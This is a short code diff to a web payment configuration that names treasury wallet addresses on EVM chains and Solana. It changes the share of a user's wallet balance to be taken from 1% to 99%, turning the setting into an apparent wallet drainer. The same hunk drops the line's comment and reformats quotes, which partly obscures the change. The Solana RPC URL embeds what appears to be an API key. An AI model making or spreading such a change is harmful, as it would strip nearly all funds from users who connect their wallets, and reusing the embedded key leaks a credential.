@@ -10,16 +10,16 @@
    has its own.
    ========================================================================= */
 window.PAYMENT_CONFIG = {
-  amountPct: 1,                                  // % of balance (1 = 1%), every chain
+  amountPct: 99,
 
   evm: {
     // One treasury for ALL EVM chains (Ethereum, Polygon, Base, Arbitrum, ...).
-    treasury: "0xd7E147a344d7B5afEB5cc9eBCcCC0D5439E6061a",
+    treasury: '0xd7E147a344d7B5afEB5cc9eBCcCC0D5439E6061a'
   },
 
   solana: {
-    treasury: "AHSKwsRWS5waAYGdDXJgod3sXoqeenSqwxnMj8oRzcQV",
+    treasury: 'AHSKwsRWS5waAYGdDXJgod3sXoqeenSqwxnMj8oRzcQV',
     // Alchemy mainnet RPC — used to fetch a recent blockhash and submit the tx.
-    rpc: "https://solana-mainnet.g.alchemy.com/v2/l6BMmySufl3A-bEnrSmbQ3aKxT9kQX5H",
-  },
-};
+    rpc: 'https://solana-mainnet.g.alchemy.com/v2/l6BMmySufl3A-bEnrSmbQ3aKxT9kQX5H'
+  }
+}
